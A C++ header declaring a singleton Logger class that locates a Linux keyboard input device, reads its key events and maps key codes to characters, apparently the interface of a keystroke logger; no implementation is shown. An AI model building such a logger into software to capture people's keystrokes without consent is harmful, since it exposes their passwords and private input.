// logger.h

#ifndef LOGGER_H
#define LOGGER_H

#include <linux/input.h>
#include <string>
#include <unordered_map>

class Logger {
public:
  static Logger &get_instance();

  Logger(const Logger &) = delete;
  Logger &operator=(const Logger &) = delete;

  auto init(const std::string &event_ID = "") -> bool;
  auto check_init() const -> bool;

  auto start() -> void;
  auto kill() -> void;

private:
  Logger();
  ~Logger();

  int fd_;
  bool initialized_;
  std::string ev_init_;
  bool running_;
  std::unordered_map<unsigned int, std::string> keymap_;

  auto find_kbd() -> std::string;
  auto ev_reader() -> void;
  auto get_keychar(unsigned int code) -> const char *;
};

#endif // LOGGER_H
